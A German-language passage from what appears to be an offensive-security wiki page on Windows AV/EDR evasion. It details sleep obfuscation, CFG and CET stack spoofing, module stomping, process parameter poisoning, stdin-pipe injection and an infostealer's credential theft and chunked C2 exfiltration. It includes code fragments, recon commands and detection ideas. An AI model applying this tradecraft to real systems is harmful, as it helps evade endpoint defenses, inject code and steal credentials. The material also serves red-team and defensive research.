- Umgehung der Image-Ladeüberwachung: Wenn LoadLibrary* gehookt wird, verdächtige Ladevorgänge von Automation-/CLR-Assemblies überwachen, die mit Memory-Masking-Ereignissen korrelieren.

Verwandte Bausteine und Beispiele
- Reflective Loader, die während des Ladevorgangs IAT-Patching durchführen (z. B. TitanLdr, AceLdr)
- Memory-Masking-Hooks (z. B. simplehook) und Stack-Cutting-PIC (stackcutting)
- PIC-Call-Stack-Spoofing-Stubs (z. B. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-Time-IAT-Hooks über ein residentes PICO

Wenn du einen Reflective Loader kontrollierst, kannst du Imports **während** `ProcessImports()` hooken, indem du den `GetProcAddress`-Zeiger des Loaders durch einen benutzerdefinierten Resolver ersetzt, der zuerst Hooks prüft:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Erstelle ein **residentes PICO** (persistentes PIC-Objekt), das bestehen bleibt, nachdem sich der transiente Loader-PIC selbst freigegeben hat.
- Exportiere eine Funktion `setup_hooks()`, die den Import-Resolver des Loaders überschreibt (z. B. `funcs.GetProcAddress = _GetProcAddress`).
- Überspringe in `_GetProcAddress` Imports nach Ordinal und verwende eine hashbasierte Hook-Suche wie `__resolve_hook(ror13hash(name))`. Gibt es einen Hook, gib ihn zurück; andernfalls leite den Aufruf an das echte `GetProcAddress` weiter.
- Registriere Hook-Ziele beim Linken mit Crystal-Palace-Einträgen wie `addhook "MODULE$Func" "hook"`. Der Hook bleibt gültig, weil er im residenten PICO liegt.

So wird eine **IAT-Umleitung zur Importzeit** erreicht, ohne nach dem Laden die Code-Section der geladenen DLL zu patchen.

### Erzwingen hookbarer Imports, wenn das Ziel PEB-walking verwendet

Import-Time-Hooks werden nur ausgelöst, wenn sich die Funktion tatsächlich in der IAT des Ziels befindet. Wenn ein Modul APIs per PEB-walk + Hash auflöst (ohne Import-Eintrag), erzwinge einen echten Import, damit der Pfad `ProcessImports()` des Loaders ihn erfasst:

- Ersetze die Auflösung gehashter Exports (z. B. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) durch eine direkte Referenz wie `&WaitForSingleObject`.
- Der Compiler erzeugt einen IAT-Eintrag, wodurch die Abfangung möglich wird, wenn der Reflective Loader Imports auflöst.

### Ekko-artige Sleep-/Idle-Verschleierung ohne Patchen von `Sleep()`

Statt `Sleep` zu patchen, hooke die **tatsächlichen Wait-/IPC-Primitiven**, die das Implantat verwendet (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Bei langen Wartezeiten kapsle den Aufruf in eine Ekko-artige Verschleierungskette ein, die das Image im Speicher während der Idle-Phase verschlüsselt:<sup>[[31]](#references)[[27]](#references)</sup>

- Verwende `CreateTimerQueueTimer`, um eine Folge von Callbacks zu planen, die `NtContinue` mit speziell vorbereiteten `CONTEXT`-Frames aufrufen.
- Typische Kette (x64): Image auf `PAGE_READWRITE` setzen → RC4-Verschlüsselung mit `advapi32!SystemFunction032` über das gesamte gemappte Image → blockierende Warteoperation ausführen → RC4-Entschlüsselung → **abschnittsspezifische Berechtigungen wiederherstellen**, indem die PE-Sections durchlaufen werden → Abschluss signalisieren.
- `RtlCaptureContext` liefert eine Vorlage für `CONTEXT`; klone sie in mehrere Frames und setze Register (`Rip/Rcx/Rdx/R8/R9`), um jeden Schritt aufzurufen.

Operatives Detail: Gib bei langen Wartezeiten (z. B. `WAIT_OBJECT_0`) „Erfolg“ zurück, damit der Aufrufer fortfährt, während das Image maskiert ist. Dieses Muster verbirgt das Modul während Idle-Fenstern vor Scannern und vermeidet die typische Signatur eines „gepatchten `Sleep()`“.

Erkennungsideen (telemetriebasiert)
- Serien von `CreateTimerQueueTimer`-Callbacks, die auf `NtContinue` zeigen.
- `advapi32!SystemFunction032`, das auf großen, zusammenhängenden Puffern in Image-Größe verwendet wird.
- Großflächiges `VirtualProtect`, gefolgt von der benutzerdefinierten Wiederherstellung abschnittsspezifischer Berechtigungen.

### Laufzeitregistrierung von CFG-Zielen für Sleep-Obfuscation-Gadgets

Auf CFG-aktivierten Zielen führt der erste indirekte Sprung zu einem Gadget mitten in einer Funktion, etwa `jmp [rbx]` oder `jmp rdi`, normalerweise zum Absturz des Prozesses mit `STATUS_STACK_BUFFER_OVERRUN`, weil das Gadget nicht in den CFG-Metadaten des Moduls enthalten ist. Damit Ekko-/Kraken-artige Ketten in gehärteten Prozessen funktionieren:<sup>[[30]](#references)</sup>

- Registriere jedes indirekte Ziel der Kette mit `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` und `CFG_CALL_TARGET_VALID`-Einträgen.
- Bei Adressen in geladenen Images (`ntdll`, `kernel32`, `advapi32`) muss der `MEMORY_RANGE_ENTRY` an der **Image-Basis** beginnen und die **gesamte Image-Größe** umfassen.
- Verwende für manuell gemappte/PIC-/gestompte Bereiche stattdessen die **Allokationsbasis** und die Allokationsgröße.
- Markiere nicht nur das Dispatch-Gadget, sondern auch indirekt aufgerufene Exports (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, Wait-/Event-Systemaufrufe) sowie ausführbare, vom Angreifer kontrollierte Sections, die indirekte Ziele werden.

Damit werden Sleep-Ketten im ROP-/JOP-Stil von „funktioniert nur in Prozessen ohne CFG“ zu einer wiederverwendbaren Primitive für `explorer.exe`, Browser, `svchost.exe` und andere mit `/guard:cf` kompilierte Endpunkte.

### CET-sicheres Stack-Spoofing für schlafende Threads

Das vollständige Ersetzen von `CONTEXT` ist auffällig und kann auf CET-Shadow-Stack-Systemen fehlschlagen, weil ein gefälschtes `Rip` weiterhin mit dem Hardware-Shadow-Stack übereinstimmen muss. Ein sichereres Sleep-Masking-Muster ist:<sup>[[30]](#references)</sup>

- Wähle einen anderen Thread im selben Prozess und lies über `NtQueryInformationThread` dessen `NT_TIB`-/TEB-Stackgrenzen (`StackBase`, `StackLimit`) aus.
- Sichere den echten TEB/TIB des aktuellen Threads.
- Erfasse den echten Schlafkontext mit `GetThreadContext`.
- Kopiere **nur** das echte `Rip` in den Spoof-Kontext und lasse den gefälschten `Rsp`-/Stack-Zustand unverändert.
- Kopiere während des Sleep-Fensters den `NT_TIB` des Spoof-Threads in den TEB des aktuellen Threads, damit Stack-Walker innerhalb eines legitimen Stack-Bereichs auflösen.
- Stelle nach Ende der Warteoperation den ursprünglichen TIB und Thread-Kontext wieder her.

So bleibt der Instruction Pointer mit CET konsistent, während EDR-Stack-Walker getäuscht werden, die sich bei der Validierung von Unwinds auf TEB-Stack-Metadaten verlassen.

### APC-basierte Alternative: Kraken Mask

Wenn Timer-Queue-Dispatch zu viele eindeutige Signaturen aufweist, lässt sich dieselbe Sleep-Encrypt-Spoof-Restore-Sequenz von einem angehaltenen Hilfsthread ausführen, indem queued APCs verwendet werden:<sup>[[27]](#references)</sup>

- Erstelle einen Hilfsthread mit `NtTestAlert` als Einstiegspunkt.
- Stelle vorbereitete `CONTEXT`-Frames/APCs mit `NtQueueApcThread` in die Warteschlange und arbeite sie mit `NtAlertResumeThread` ab.
- Speichere den Zustand der Kette auf dem Heap statt auf dem Stack des Hilfsthreads, um den standardmäßigen 64-KB-Thread-Stack nicht zu erschöpfen.
- Verwende `NtSignalAndWaitForSingleObject`, um das Start-Ereignis atomar zu signalisieren und zu blockieren.
- Halte den Hauptthread an, bevor du TIB/Kontext wiederherstellst (`NtSuspendThread` → Wiederherstellung → `NtResumeThread`), um das Zeitfenster zu verkleinern, in dem ein Scanner einen teilweise wiederhergestellten Stack erfassen könnte.

Damit wird die Signatur `CreateTimerQueueTimer` + `NtContinue` durch eine Hilfsthread-/APC-Signatur ersetzt, während dieselben Ziele für RC4-Masking und Stack-Spoofing erhalten bleiben.

Zusätzliche Erkennungsideen
- `NtSetInformationVirtualMemory` mit `VmCfgCallTargetInformation` kurz vor Sleeps, Warteoperationen oder APC-Dispatch.
- `GetThreadContext`/`SetThreadContext` in Verbindung mit `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` oder `ConnectNamedPipe`.
- `NtQueryInformationThread`, gefolgt von direkten Schreibzugriffen auf die Stackgrenzen des TEB/TIB des aktuellen Threads.
- `NtQueueApcThread`-/`NtAlertResumeThread`-Ketten, die indirekt `SystemFunction032`, `VirtualProtect` oder Hilfsfunktionen zur Wiederherstellung von Section-Berechtigungen aufrufen.
- Wiederholte Verwendung kurzer Gadget-Signaturen wie `FF 23` (`jmp [rbx]`) oder `FF E7` (`jmp rdi`) als Dispatch-Pivots in signierten Modulen.


## Precision Module Stomping

Module Stomping führt Payloads aus der **`.text`-Section einer DLL aus, die bereits im Zielprozess gemappt ist**, statt auffälligen privaten ausführbaren Speicher zuzuweisen oder eine neue sacrificial DLL zu laden. Das Überschreibungsziel sollte ein **geladenes, dateigestütztes Image** sein, dessen Codebereich die Payload aufnehmen kann, ohne noch benötigte Codepfade des Prozesses zu beschädigen.<sup>[[1]](#references)[[2]](#references)</sup>

### Zuverlässige Zielauswahl

Naives Stomping auf gängigen Modulen wie `uxtheme.dll` oder `comctl32.dll` ist anfällig: Die DLL ist möglicherweise nicht im Remote-Prozess geladen, und ein zu kleiner Codebereich kann den Prozess zum Absturz bringen. Ein zuverlässigerer Ablauf:

1. Zähle die Module des Zielprozesses auf und behalte eine **Include-Liste nur mit Namen** der bereits geladenen DLLs.
2. Erstelle zuerst die Payload und notiere ihre **exakte Byte-Größe**.
3. Durchsuche Kandidaten-DLLs auf der Festplatte und vergleiche `Misc_VirtualSize` der PE-Section **`.text`** mit der Payload-Größe. Das ist wichtiger als die Dateigröße, da es die Größe des ausführbaren Abschnitts **im gemappten Speicher** widerspiegelt.
4. Parse die **Export Address Table (EAT)** und wähle die RVA einer exportierten Funktion als Start-Offset für das Stomping.
5. Berechne den **Wirkungsbereich**: Wenn die Payload die ausgewählte Funktionsgrenze überschreitet, überschreibt sie benachbarte Exports, die im Speicher danach angeordnet sind.

Typische Recon-/Auswahlhilfen aus der Praxis:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Betriebshinweise
- Bevorzuge DLLs, die im Remote-Prozess **bereits geladen** sind, um die Telemetrie von `LoadLibrary`/unerwarteten Image-Ladevorgängen zu vermeiden.
- Bevorzuge Exports, die von der Zielanwendung nur selten ausgeführt werden. Andernfalls können normale Codepfade die gestompten Bytes vor oder nach der Thread-Erstellung erreichen.
- Bei großen Implants muss das Einbetten des Shellcodes oft von einem String-Literal auf einen **Byte-Array-/Braced-Initializer** umgestellt werden, damit der gesamte Buffer im Injector-Quellcode korrekt dargestellt wird.

Erkennungsideen
- Remote-Schreibvorgänge in ausführbare, Image-gestützte Seiten (`MEM_IMAGE`, `PAGE_EXECUTE*`) statt in die häufigeren privaten RWX/RX-Allokationen.
- Export-Einstiegspunkte, deren Bytes im Speicher nicht mehr mit der Backing-Datei auf der Festplatte übereinstimmen.
- Remote-Threads oder Context-Pivots, deren Ausführung innerhalb eines legitimen DLL-Exports beginnt, dessen erste Bytes kürzlich geändert wurden.
- Verdächtige `VirtualProtect(Ex)`-/`WriteProcessMemory`-Sequenzen gegen DLL-`.text`-Seiten, auf die eine Thread-Erstellung folgt.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) ist eine **Prozess-Injection-/EDR-Evasion-Technik**, die den klassischen Remote-Schreibpfad (`VirtualAllocEx` + `WriteProcessMemory`) umgeht. Statt Bytes in ein bereits laufendes Ziel zu kopieren, missbraucht sie die Tatsache, dass Windows **ausgewählte Startparameter von `CreateProcessW` in den Kindprozess kopiert** und in `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) speichert.<sup>[[28]](#references)[[29]](#references)</sup>

### Durch `CreateProcessW` kopierbare Träger

Nützliche Träger sind:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (mit `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Praktische Einschränkungen der Träger:

- `lpCommandLine` muss für `CreateProcessW` auf **beschreibbaren Speicher** zeigen und ist auf **32.767 Unicode-Zeichen** einschließlich des Nullterminators begrenzt.
- `lpEnvironment` muss ein Unicode-Umgebungsblock aus aufeinanderfolgenden `NAME=VALUE\0`-Strings sein, die mit einem zusätzlichen `\0` enden.
- `lpReserved` ist offiziell reserviert, daher sollte das `ShellInfo`-Mapping als Implementierungsdetail und nicht als stabiler, dokumentierter Vertrag betrachtet werden.

Dadurch wird die normale Prozesserstellung zum **Payload-Transfer-Primitiv**. Der Operator erstellt den Kindprozess mit vom Angreifer kontrollierten Startdaten und überlässt Windows die prozessübergreifende Kopie.

### Remote-Suchablauf ohne Remote-Schreib-APIs

Nachdem der Kindprozess erstellt wurde, wird der kopierte Buffer mit **nur lesenden** Primitiven aufgelöst:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` ermitteln
2. Den Remote-`PEB` lesen
3. `PEB.ProcessParameters` folgen
4. `RTL_USER_PROCESS_PARAMETERS` lesen
5. Den ausgewählten Pointer verwenden:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimaler Ablauf:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Ausführen des kopierten Parameterpuffers

Die kopierte Parameterregion ist normalerweise `RW`, nicht ausführbar. Eine gängige P3-Kette ist:

1. Den Prozess normal erstellen (nicht im angehaltenen Zustand)
2. Die gewählte Parameterseite mit `NtProtectVirtualMemory` / `VirtualProtectEx` ausführbar machen
3. Den bereits in `PROCESS_INFORMATION` zurückgegebenen Handle des Hauptthreads wiederverwenden
4. Die Ausführung mit `NtSetContextThread` umleiten (`CONTEXT_CONTROL`, `RIP` überschreiben)

Anders als bei klassischen Thread-Hijacking-Workflows sind hierfür **`SuspendThread` / `ResumeThread` nicht erforderlich**; der Kontext kann direkt über den zurückgegebenen Handle des Hauptthreads geändert werden.

Dadurch werden mehrere APIs umgangen, die häufig auf Injection überwacht werden:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- oft auch `SuspendThread` / `ResumeThread`

### Nullbyte-Einschränkung und gestagtes Shellcode

Alle drei Träger sind **Strings oder stringähnliche Daten**. Ein rohes Payload mit `0x00` wird daher bei der Übertragung abgeschnitten. Ein praktischer Workaround ist eine **nullbytefreie erste Stage**, die Konstanten zur Laufzeit rekonstruiert und anschließend eine beliebige zweite Stage lädt.

Ein einfaches Muster ist die XOR-basierte Synthese von Konstanten:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Damit kann die erste Stage Stack-Strings, API-Argumente, DLL-Pfade oder einen Shellcode-Loader der zweiten Stage erstellen, ohne Nullbytes in den übertragenen Parameter einzubetten.

### Stack-basierte API-Aufrufe aus der ersten Stage

Wenn die erste Stage APIs wie `LoadLibraryA` aufrufen muss, kann sie:

- den String/Buffer auf den Stack des Ziels legen
- den **32-Byte-x64-Shadow-Space** reservieren
- `RCX`, `RDX`, `R8`, `R9` auf Konstanten oder `RSP`-relative Zeiger setzen
- `RSP` vor dem Aufruf **16-Byte-ausgerichtet** halten

Anschließend kann eine zweite Stage vom Stack in eine `PAGE_READWRITE`-Allokation kopiert, mit `VirtualProtect` auf `PAGE_EXECUTE_READ` umgestellt und angesprungen werden. So wird eine direkte RWX-Allokation vermieden.

### Detection-Ideen

Gute Hunting-Möglichkeiten, die die Autoren erwähnen:

- `VirtualProtectEx` / `NtProtectVirtualMemory`, das **Prozessparameterseiten ausführbar** macht
- auf diese Schutzänderung folgend `SetThreadContext` / `NtSetContextThread`
- Remote Reads des `PEB` und anschließend von `RTL_USER_PROCESS_PARAMETERS`
- ungewöhnlich lange oder entropiereiche Werte in `lpCommandLine`, `lpEnvironment` oder `STARTUPINFO.lpReserved` bei der Prozesserstellung

### Hinweise

- P3 ist ein **prozessübergreifender Transfer-Trick**, aber für sich genommen keine vollständige Ausführungsprimitive: Für den kopierten Parameter sind weiterhin eine Änderung der Ausführungsberechtigungen und eine Methode zur Umleitung der Ausführung erforderlich.
- `RtlCreateProcessReflection` / Dirty Vanity wurde von den Autoren in Betracht gezogen, aber verworfen, da intern verdächtige Primitives wie `NtWriteVirtualMemory` und `NtCreateThreadEx` zum Einsatz kommen.

## Console-STDIN-Pipe-Injection

Ein interaktiver Console-Child kann ebenfalls als **Payload-Transfer-Primitive** verwendet werden. Der Injector leitet die Standardeingabe des Childs in eine Pipe um und sendet einen Marker gefolgt von Shellcode. Nachdem das Console-Programm die Daten in seinen eigenen privaten Speicher gelesen hat, findet der Injector diesen Buffer, macht ihn ausführbar und leitet einen Thread des Childs dorthin um. Dadurch werden `VirtualAllocEx` und `WriteProcessMemory` vermieden, aber es handelt sich weiterhin um Process Injection und nicht um einen allgemeinen EDR-Bypass.<sup>[[41]](#references)</sup>

Trotz der Beschreibung als „named-pipe“ ruft die Referenzimplementierung `CreatePipe` auf, wodurch eine **anonyme Pipe** erstellt wird. Windows implementiert anonyme Pipes intern mit eindeutig benannten Pipe-Objekten, doch der PoC wählt weder einen Pfad wie `\\.\pipe\<name>` aus noch ruft er `CreateNamedPipe` auf. Er erstellt vererbbare Handles mit einem standardmäßigen Sicherheitsdeskriptor, legt das Lese-Handle in `STARTUPINFO.hStdInput` ab, setzt `STARTF_USESTDHANDLES` und startet mit aktivierter Handle-Vererbung einen neuen Child. Daher startet dieser PoC die angegebene Console-Executable; er verbindet seine Pipe nicht mit einem bestehenden Prozess.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referenz-Workflow

Die Implementierung verwendet folgende Abfolge:<sup>[[41]](#references)</sup>

1. Anonyme Pipe-Paare für `STDIN` und `STDOUT` des Childs erstellen. Die Vererbung der beiden Handles auf der Parent-Seite deaktivieren und nach der Prozesserstellung die Duplikate auf der Child-Seite im Parent schließen.
2. Eine interaktive Executable wie `netsh.exe` oder `nslookup.exe` mit `CREATE_NEW_CONSOLE` starten. Das Child erbt die umgeleiteten Standard-Handles.
3. Das vollständige binäre `rawData`-Array mit `WriteFile` über das `STDIN`-Handle auf der Parent-Seite senden. Das Console-Programm verarbeitet die Bytes und hinterlässt eine Kopie in einem seiner privaten, committeten Speicherbereiche.
4. Den Adressraum des Childs mit `VirtualQueryEx` durchlaufen, potenzielle `MEM_PRIVATE`-Bereiche mit `ReadProcessMemory` lesen und am Anfang von `rawData` nach dem Marker suchen.
5. Den gefundenen Buffer mit `VirtualProtectEx` auf `PAGE_EXECUTE_READWRITE` setzen.
6. Den Main Thread identifizieren, ihn anhalten, `RIP` mit `NtSetContextThread` auf `found_address + 0x19` setzen und ihn fortsetzen.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Die bereitgestellte Implementierung ist x64-spezifisch: Sie ändert `CONTEXT.Rip`, und das eingebettete Payload ist x64-Shellcode. `rawData` beginnt mit einem 25-Byte-Marker, daher beginnen die ausführbaren Bytes beim hexadezimalen Offset `0x19`. Beim Ersetzen des Payloads muss dieses Layout erhalten bleiben, oder Marker, Suchvektor, Array-Größe und Ausführungs-Offset müssen gemeinsam aktualisiert werden. Die Quellkommentare führen außerdem `0x0A`, `0x0D` und `0x1A` als Bad Characters auf. Dieser Workflow ändert weder das Token noch die Berechtigungen des Child-Prozesses.<sup>[[41]](#references)</sup>

Kleine native Helfer und Muster für die Payload-Kompilierung finden Sie unter [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## SantaStealer-Techniken für Fileless-Evasion und Credential-Diebstahl

SantaStealer (auch bekannt als BluelineStealer) veranschaulicht, wie moderne Info-Stealer AV-Bypass, Anti-Analyse und Credential-Zugriff in einem einzigen Workflow kombinieren.<sup>[[24]](#references)</sup>

### Erkennung anhand des Tastaturlayouts & Sandbox-Verzögerung

- Ein Konfigurations-Flag (`anti_cis`) listet mithilfe von `GetKeyboardLayoutList` die installierten Tastaturlayouts auf. Wird ein kyrillisches Layout gefunden, legt das Sample einen leeren `CIS`-Marker an und beendet sich, bevor Stealer ausgeführt werden. So wird sichergestellt, dass es in ausgeschlossenen Sprachregionen nicht detoniert und zugleich ein Artefakt für die Threat-Jagd hinterlässt.

```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
    LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
    if (lang == LANG_RUSSIAN) {
        CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
        ExitProcess(0);
    }
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```

### Geschichtete `check_antivm`-Logik

- Variante A durchläuft die Prozessliste, hasht jeden Namen mit einer benutzerdefinierten rollierenden Prüfsumme und vergleicht sie mit eingebetteten Blocklisten für Debugger/Sandboxes. Anschließend berechnet sie die Prüfsumme erneut für den Computernamen und prüft Arbeitsverzeichnisse wie `C:\analysis`.
- Variante B untersucht Systemeigenschaften (Mindestanzahl an Prozessen, kurze Systemlaufzeit), ruft `OpenServiceA("VBoxGuest")` auf, um VirtualBox Additions zu erkennen, und führt Timing-Prüfungen rund um Wartezeiten durch, um Einzelschritte zu erkennen. Jeder Treffer führt zum Abbruch, bevor Module gestartet werden.

### Fileless-Helper + doppelte ChaCha20-Reflective-Loading

- Die primäre DLL/EXE enthält einen Chromium-Credential-Helper, der entweder auf die Festplatte geschrieben oder manuell in den Speicher gemappt wird. Im Fileless-Modus löst der Helper Imports/Relocations selbst auf, sodass keine Helper-Artefakte geschrieben werden.
- Der Helper speichert eine Second-Stage-DLL, die zweimal mit ChaCha20 verschlüsselt ist (zwei 32-Byte-Schlüssel + 12-Byte-Nonces). Nach beiden Durchläufen lädt er den Blob reflectively (ohne `LoadLibrary`) und ruft die Exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup` auf, die von [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption) abgeleitet sind.<sup>[[25]](#references)</sup>
- Die ChromElevator-Routinen verwenden Reflective Process Hollowing mit Direct Syscalls, um in einen aktiven Chromium-Browser zu injizieren, AppBound-Encryption-Schlüssel zu übernehmen und Passwörter/Cookies/Kreditkartendaten trotz ABE-Härtung direkt aus SQLite-Datenbanken zu entschlüsseln.

### Modulare In-Memory-Erfassung & chunked HTTP-Exfil

- `create_memory_based_log` durchläuft eine globale Funktionzeigertabelle `memory_generators` und startet für jedes aktivierte Modul einen Thread (Telegram, Discord, Steam, Screenshots, Dokumente, Browser-Erweiterungen usw.). Jeder Thread schreibt Ergebnisse in gemeinsam genutzte Puffer und meldet die Anzahl seiner Dateien nach einer Join-Wartezeit von etwa 45 Sekunden.
- Nach Abschluss wird alles mit der statisch gelinkten `miniz`-Bibliothek als `%TEMP%\\Log.zip` gezippt. `ThreadPayload1` wartet dann 15 Sekunden und überträgt das Archiv in 10-MB-Chunks per HTTP POST an `http://<C2>:6767/upload`, wobei eine Browser-`multipart/form-data`-Boundary (`----WebKitFormBoundary***`) vorgetäuscht wird. Jeder Chunk enthält `User-Agent: upload`, `auth: <build_id>`, optional `w: <campaign_tag>`, und an den letzten Chunk wird `complete: true` angehängt, damit der C2 weiß, dass der Zusammenbau abgeschlossen ist.

## References

- [1] [Advanced Evasion Tradecraft: Präzises Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
- [3] [Crystal Kit – Blog](https://rastamouse.me/crystal-kit/)
- [4] [Crystal-Kit – GitHub](https://github.com/rasta-mouse/Crystal-Kit)
- [5] [Elastic – Call stacks: keine Freifahrten mehr für Malware](https://www.elastic.co/security-labs/call-stacks-no-more-free-passes-for-malware)
- [6] [Crystal Palace – Dokumentation](https://tradecraftgarden.org/docs.html)
- [7] [simplehook – Beispiel](https://tradecraftgarden.org/simplehook.html)
- [8] [stackcutting – Beispiel](https://tradecraftgarden.org/stackcutting.html)
- [9] [Draugr – PIC zum Spoofing von Call-Stacks](https://github.com/NtDallas/Draugr)
- [10] [Unit42 – Neue Infektionskette und ConfuserEx-basierte Verschleierung für den DarkCloud Stealer](https://unit42.paloaltonetworks.com/new-darkcloud-stealer-infection-chain/)
- [11] [Synacktiv – Sollte man seiner Zero Trust vertrauen? Zscaler-Posture-Checks umgehen](https://www.synacktiv.com/en/publications/should-you-trust-your-zero-trust-bypassing-zscaler-posture-checks.html)
- [12] [Check Point Research – Vor ToolShell: Einblicke in die früheren Ransomware-Operationen von Storm-2603](https://research.checkpoint.com/2025/before-toolshell-exploring-storm-2603s-previous-ransomware-operations/)
- [13] [Hexacorn – DLL ForwardSideLoading: Missbrauch weitergeleiteter Exports](https://www.hexacorn.com/blog/2025/08/19/dll-forwardsideloading/)
- [14] [Inventar weitergeleiteter Exports in Windows 11 (apis_fwd.txt)](https://hexacorn.com/d/apis_fwd.txt)
- [15] [Microsoft Learn – Suchreihenfolge für Dynamic-Link Libraries](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [16] [Microsoft Learn – Prozesssicherheit und Zugriffsrechte](https://learn.microsoft.com/en-us/windows/win32/procthread/process-security-and-access-rights)
- [17] [Microsoft – EKU-Referenz (MS-PPSEC)](https://learn.microsoft.com/openspecs/windows_protocols/ms-ppsec/651a90f3-e1f5-4087-8503-40d804429a88)
- [18] [Sysinternals – Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [19] [CreateProcessAsPPL-Launcher](https://github.com/2x7EQ13/CreateProcessAsPPL)
- [20] [Zero Salarium – EDRs mit Unterstützung von Protected Process Light (PPL) entgegenwirken](https://www.zerosalarium.com/2025/08/countering-edrs-with-backing-of-ppl-protection.html)
- [21] [Zero Salarium – Die Schutzschale von Windows Defender mit der Folder-Redirect-Technik durchbrechen](https://www.zerosalarium.com/2025/09/Break-Protective-Shell-Windows-Defender-Folder-Redirect-Technique-Symlink.html)
- [22] [Microsoft – Referenz zum Befehl mklink](https://learn.microsoft.com/windows-server/administration/windows-commands/mklink)
- [23] [Check Point Research – Hinter dem reinen Vorhang: Vom RAT über den Builder zum Coder](https://research.checkpoint.com/2025/under-the-pure-curtain-from-rat-to-builder-to-coder/)
- [24] [Rapid7 – SantaStealer kommt in die Stadt: Ein neuer, ambitionierter Infostealer](https://www.rapid7.com/blog/post/tr-santastealer-is-coming-to-town-a-new-ambitious-infostealer-advertised-on-underground-forums)
- [25] [ChromElevator – Ver- und Entschlüsselung von Chrome App-Bound Encryption](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption)
- [26] [Check Point Research – GachiLoader: Node.js-Malware mit API-Tracing abwehren](https://research.checkpoint.com/2025/gachiloader-node-js-malware-with-api-tracing/)
- [27] [Schlafende Schönheit: Adaptix mit Crystal Palace zur Ruhe legen](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty/)
- [28] [SensePost – Process Parameter Poisoning](https://sensepost.com/blog/2026/process-parameter-poisoning/)
- [29] [Orange Cyberdefense – p3-loader](https://github.com/Orange-Cyberdefense/p3-loader)
- [30] [Schlafende Schönheit II: CFG, CET und Stack Spoofing](https://maorsabag.github.io/posts/adaptix-stealthpalace/sleeping-beauty-ii)
- [31] [Ekko-Sleep-Obfuscation](https://github.com/Cracked5pider/Ekko)
- [32] [SysWhispers4 – GitHub](https://github.com/JoasASantos/SysWhispers4)
- [33] [blog.xpnsec.com – Dotnet-ETW verbergen](https://blog.xpnsec.com/hiding-your-dotnet-etw)
- [34] [repnz/etw-providers-docs](https://github.com/repnz/etw-providers-docs)
- [35] [trustedsec.com – Chrome Remote Desktop bei Red-Team-Operationen missbrauchen: Ein praktischer Leitfaden](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide)
- [36] [Check Point Research – BTR Reforged: Defenders Remediation Driver als Kernel-Operationsprimitive einsetzen](https://research.checkpoint.com/2026/btr-reforged-weaponizing-defenders-remediation-driver-as-a-kernel-operation-primitive/)
- [37] [Dump-GUY – BTR_CLI](https://github.com/Dump-GUY/BTR_CLI)
- [38] [Begleitcode zu MDSec Function Peekaboo](https://github.com/mdsecactivebreach/functionpeekaboo)
- [39] [MDSec – Function Peekaboo: Selbstmaskierende Funktionen mit LLVM erstellen](https://mdsec.co.uk/2025/10/function-peekaboo-crafting-self-masking-functions-using-llvm/)
- [40] [Microsoft Learn – VirtualProtect](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect)
- [41] [TwoSevenOneT – InjectSetConsole-Quellcode](https://github.com/TwoSevenOneT/InjectSetConsole)
- [42] [Microsoft Learn – CreatePipe-Funktion](https://learn.microsoft.com/en-us/windows/win32/api/namedpipeapi/nf-namedpipeapi-createpipe)
